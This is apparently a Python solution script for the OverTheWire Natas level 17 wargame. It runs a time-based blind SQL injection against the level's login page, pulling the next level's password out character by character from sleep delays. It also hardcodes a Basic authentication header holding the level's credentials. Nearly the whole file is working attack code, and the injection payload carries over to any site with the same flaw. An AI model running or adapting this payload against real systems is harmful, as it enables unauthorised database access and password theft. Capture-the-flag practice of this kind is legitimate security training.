#!/bin/python3
import requests
import time
import sys
import string

ascii_chars = string.digits
ascii_chars += string.ascii_letters
result = ""

for i in range(1,33):
    for char in ascii_chars:
        ascii_value = ord(char)
        #print(ascii_value)
        payload = 'admin" or (IF(ASCII(SUBSTRING((SELECT password from users where username="natas18"),%s,1))=%s, sleep(2), NULL));-- -' %(i, ascii_value)
#        print(payload)
        burp0_url = "http://natas17.natas.labs.overthewire.org:80/index.php?debug=&username=" + requests.utils.quote(payload)
        burp0_headers = {"Cache-Control": "max-age=0", "Authorization": "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==", "Upgrade-Insecure-Requests": "1", "Origin": "http://natas17.natas.labs.overthewire.org", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://natas17.natas.labs.overthewire.org/index.php?debug=", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,ja;q=0.8", "Connection": "close"}
        start_time = time.time()
        requests.get(burp0_url, headers=burp0_headers)
        end_time = time.time()
        control_time = end_time - start_time
        print("Time it takes for %s: " %char + str(int(control_time)) + "seconds", end="\r")
        if int(control_time) >= int(8):
            print("Found %s at %s position, which took: %s seconds" % (char, i, str(int(control_time))), end="\r\n")
            result += char
            break

print("The key for natas18 is:" + result)
